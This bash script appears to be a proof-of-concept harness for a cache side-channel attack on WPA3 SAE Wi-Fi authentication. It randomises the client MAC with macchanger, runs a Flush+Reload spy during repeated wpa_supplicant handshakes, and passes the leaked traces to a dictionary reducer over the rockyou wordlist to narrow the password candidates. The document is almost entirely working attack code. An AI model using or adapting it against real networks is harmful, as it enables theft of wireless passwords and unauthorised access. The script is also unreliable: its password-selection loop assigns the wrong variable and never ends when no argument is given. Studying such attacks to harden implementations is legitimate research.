#!/bin/bash

# We may need to extract the archive the first time
[ -f $DATA_DIR/rockyou.txt ] || tar xzf $DATA_DIR/rockyou.txt.tar.gz -C $DATA_DIR
DICTIONARY=$DATA_DIR/rockyou.txt

# For a single given password (that we assume to be the right password, we will make exploit the leakage for nb_test different MAC addresses in order to get 2^$nb_traces bit of information
# For each MAC address, we repeat the measurement $nb_measurment times to smooth out potential errors.
nb_traces=20
nb_measurements=4
# Set the right password in the configuration so that the client uses it
if [ -z "$1" ]; then
    password=""
    echo "Looking for a password at least 8-byte long (mandatory for SAE)"
    while [ ${#password} -lt 7 ]; do
        passwords=$(shuf -n 15 "$DICTIONARY" | tr ":" "k" | tr '-' 'k' | tr '/' 'k') 
    done
    echo -e "Password found ($password)\n"
else
    password=$1
    if [ ${#password} -lt 7 ]; then
        echo "SAE require at least an 8-byte long password, $password is only ${#password}-byte long."
        echo "Please try again with a longer password."
        exit
    fi
fi
dir="$RES_DIR/$password"


# We have some fixed values here
mkdir -p $dir
ap_mac=$(iwlist $NET_INTERFACE scan | egrep "SSID|Address" | grep -B1 "$AP_SSID" | grep "Address" | awk -F ' ' '{print $5}' | tr -d ':')

mkdir -p /etc/wpa_supplicant/
echo -e "ctrl_interface=/var/run/wpa_supplicant
update_config=1
network={
    ssid=\"$AP_SSID\"
    psk=\"$password\"
    key_mgmt=SAE
    ieee80211w=2
}" > /etc/wpa_supplicant/wpa_supplicant.conf

for i in `seq 1 $nb_traces`;
do
    # change the cli MAC. In practice, the AP mac would change, but doing so make the experimentation setup much easier
    ifconfig $NET_INTERFACE down
    cli_mac=$(macchanger -r $NET_INTERFACE | grep "New MAC" | awk -F ' ' '{print $3}' | tr -d ':')
    ifconfig $NET_INTERFACE up

    for j in `seq 1 $nb_measurements`;
    do
        printf "\rMAC %02d/$nb_traces - Measurement %2d/$nb_measurements" $i $j
        run_spy.sh -f -o "$dir/$cli_mac:$ap_mac:$password-$j.log" &
        spy_pid=$!
        sleep 0.5
        /usr/local/bin/wpa_supplicant -i $NET_INTERFACE -c /etc/wpa_supplicant/wpa_supplicant.conf -B >/dev/null
        sleep 5
        kill $spy_pid
        pkill FR-trace
        pkill wpa_supplicant
        sleep 1
    done
done

echo -e "\nDebug information:"
./shared_folder/eval_results.sh $password
[ -z "$(grep ^${password}$ ${DICTIONARY})" ] && echo "Side note: the password you are testing is not in the dictionary."

echo -e "\nPerforming dictionary reduction from the leakage we observed..."
traces=""
file_list=$(ls $dir/* | awk -F '-' '{printf "%s\n", $1}' | sort -u)
for f in $file_list; 
do 
    t=$(./parser.py $f*.log 2>/dev/null)
    conf=$(echo $t | awk -F':' '{print $5'})
    if (( $(echo "$conf > 0.50" |bc -l) ))
    then 
        traces="$traces $(echo -n $t | cut -d':' -f1,2,3)"
    fi
done
./dictionary_reducer "$DICTIONARY" $traces
